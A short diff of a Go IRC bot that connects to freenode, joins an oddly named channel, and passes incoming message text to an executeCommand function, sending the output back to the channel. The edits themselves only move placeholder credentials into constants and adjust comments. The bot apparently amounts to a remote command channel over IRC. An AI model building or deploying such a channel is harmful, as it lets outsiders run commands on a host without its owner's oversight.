@@ -12,14 +12,18 @@ import (
 const (
 	SRVADDR string = "chat.freenode.net:6667"
 	CHANNEL string = "#yyyzzzxxx"
+	NICK    string = "ZZYYXX"
+	PASS    string = "password"
+	UNAME   string = "username"
+	FNAME   string = "Full Name"
 )
 
 func main() {
 	go connect(SRVADDR, irc.ClientConfig{
-		Nick: "Z", Pass: "password", User: "username", Name: "Full Name",
+		Nick: NICK, Pass: PASS, User: UNAME, Name: FNAME,
 		Handler: irc.HandlerFunc(handler)})
 
-	fmt.Println("Whoa!"); select {}
+	select {} // prevent exit
 }
 
 func handler(c *irc.Client, m *irc.Message) {
@@ -29,7 +33,7 @@ func handler(c *irc.Client, m *irc.Message) {
 		c.WriteMessage(&irc.Message{
 			Command: "PRIVMSG",
 			Params: []string{
-				m.Params[0], // channel/user name
+				m.Params[0], // channel/user name parameter
 				executeCommand(m.Params[1]),
 			},
 		})
